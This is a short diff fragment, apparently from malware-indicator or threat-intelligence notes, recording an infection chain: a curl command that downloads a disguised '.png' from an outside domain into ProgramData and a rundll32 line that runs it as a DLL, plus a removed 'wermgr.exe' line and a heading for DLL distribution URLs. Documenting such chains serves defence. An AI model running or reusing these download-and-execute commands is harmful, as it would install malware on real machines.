@@ -20,8 +20,6 @@ curl -output C:ProgramData\512.png --url https://energizett.com/1llNOC1/300123.g
 
 rundll32.exe C:ProgramData\512.png,Wind
 
-wermgr.exe
-
 *************************************************
 
 .dll distro urls
